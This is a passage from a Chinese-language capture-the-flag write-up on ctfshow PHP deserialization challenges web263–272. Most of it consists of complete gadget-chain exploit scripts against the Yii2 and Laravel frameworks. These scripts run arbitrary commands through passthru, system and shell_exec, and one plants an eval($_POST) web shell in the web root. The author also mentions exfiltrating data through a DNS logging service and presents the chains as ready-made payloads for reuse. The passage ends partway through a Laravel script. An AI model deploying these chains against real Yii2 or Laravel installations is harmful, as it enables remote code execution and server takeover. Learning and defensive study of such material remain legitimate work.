&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>))));</span><br></pre></td></tr></table></figure><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>源码</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p>源码</p><p><img src="../images/image-20230106132930372.png" alt="image-20230106132930372"></p><p>message.php</p><p><img src="../images/image-20230106132950692.png" alt="image-20230106132950692"></p><p>这道题还是可以进行字符逃逸，只要进行序列化输出就行了，因为就是在index.php页面的时候已经会将序列化的值进行base64编码了，在message.php页面会只有代码进行base64解码和反序列化。</p><p><img src="../images/image-20230106134745018.png" alt="image-20230106134745018"></p><p><img src="../images/image-20230106134810726.png" alt="image-20230106134810726"></p><p>那么直接进行字符逃逸就行了，这里就不详细写了，因为<strong>web261</strong>已经详细写过了。</p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><p>源码</p><p><img src="../images/image-20230106140404379.png" alt="image-20230106140404379"></p><p>这里因为token是一个md5()随机数，是不可控的，那么可控的只有password，那么我们就得用到&amp;，</p><p><strong>在PHP 中引用的意思是：不同的名字访问同一个变量内容。</strong></p><p>那么我们就可以利用这一点，来使password的值恒等于token的值。</p><p><strong>paylaod</strong></p><p><img src="../images/image-20230106141939242.png" alt="image-20230106141939242"></p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><p>源码</p><p><img src="../images/image-20230106142948441.png" alt="image-20230106142948441"></p><p>这里面多了个__toString()函数。</p><p>这个函数的作用是如果实例化一个类的话，并将这个对象进行输出的话，就是调用toString函数，没有的话就会报错。</p><p>（如果反序列后的字符串中含有ctfshow的话，将不会进行__destruct()函数的调用。</p><p>因为这里的话，最后的正则判断是不能有ctfshow这个词，但是没有  /i  , 可以利用大写绕过。</p><p><strong>payload</strong></p><p><img src="../images/image-20230106145043122.png" alt="image-20230106145043122"></p><p>为什么可以直接写在post的原因是</p><p><img src="../images/image-20230106145110445.png" alt="image-20230106145110445"></p><p>php://input伪协议的作用。</p><p><strong>解法二</strong></p><p><img src="../images/image-20230106145214649.png" alt="image-20230106145214649"></p><p>类名不变，但是不能正常执行反序列化，因为{}里面的东西不对，那么直接就进行销毁，执行析构函数了。</p><h2 id="web267-yii"><a href="#web267-yii" class="headerlink" title="web267(yii)"></a>web267(yii)</h2><p>源码</p><p><img src="../images/image-20230107205741775.png" alt="image-20230107205741775"></p><p><img src="../images/image-20230107205924759.png" alt="image-20230107205924759"></p><p>登录框架是yii的，那么就可以找一下这个框架的漏洞。</p><p><img src="../images/image-20230107210119947.png" alt="image-20230107210119947"></p><p>利用admin/admin登录成功后，查看about这里的源码，发现这个注释。</p><p><img src="../images/image-20230107210335018.png" alt="image-20230107210335018"></p><p>输入view-source后出现这个。</p><p>然后就找个yii利用链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个链是执行phpinfo()的，可以在__construct函数里边修改执行命令。</p><p><img src="../images/image-20230107210926680.png" alt="image-20230107210926680"></p><p>命令执行成功，说明链表可行。</p><p>然后就修改执行命令</p><p><img src="../images/image-20230107211023372.png" alt="image-20230107211023372"></p><p>这里有个小问题就是system是无回显的，那么可以写马或者利用别的函数来解。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107211300165.png" alt="image-20230107211300165"></p><p>system   可以利用passthru替代。</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a>  yii框架漏洞解释</p><p>Yii是一套基于组件、用于开发大型Web应用的高性能PHP框架。<strong>Yii2 2.0.38</strong> 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令。</p><p>下次遇到直接拿现成的链来打就好了。</p><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>源码</p><p>和web261一样都是yii漏洞的反序列化链利用。</p><p>显然这道题的话用不了上一题的payload了    ——&gt;  就是把system替换成passthru</p><p>那我们就得换一个方法了</p><p>就是进行写码，那我们得找到当前目录的路径</p><p>(不是/var/www/html)  试过了。</p><p>那么我们就可以利用danslog.cn进行数据外带。</p><p><img src="../images/image-20230107213710478.png" alt="image-20230107213710478"></p><p>在web267中查出来的。</p><p><img src="../images/image-20230107213918120.png" alt="image-20230107213918120"></p><p>解码得到当前文件默认路径。</p><p>exp(以后遇到yii框架的题，可以拿来直接打就行了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:25:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107214350377.png" alt="image-20230107214350377"></p><p>然后去访问1.php进行rce。</p><p><img src="../images/image-20230107214429533.png" alt="image-20230107214429533"></p><p><img src="../images/image-20230107214527415.png" alt="image-20230107214527415"></p><p><strong>(下次遇到yii的题目的话，直接拿这个paylaod来打就行了)</strong></p><p>和web268一样。</p><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>源码</p><p>和web268一模一样。</p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>源码</p><p><img src="../images/image-20230107232547459.png" alt="image-20230107232547459"></p><p>这是一个Laravel的php框架，我们直接上网找链子打就行了。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:14:15</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:21:46</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"><span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>(&quot;<span class="title class_">system</span>&quot;,<span class="title class_">array</span>(&#x27;<span class="title class_">tac</span> /<span class="title class_">flag</span>&#x27;),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(<span class="title class_">array</span>(&quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),&quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;))),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>(<span class="title class_">array</span>(&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Console</span>\<span class="title class_">Kernel</span>&quot;=&gt;<span class="title class_">array</span>(&quot;<span class="title class_">concrete</span>&quot;=&gt;&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>&quot;))))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到时候可以只在脚本里修改执行的命令就行了。</p><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>源码</p><p>和上一题一样，都是Laravel框架</p><p>上题的paylaod用不了了</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title 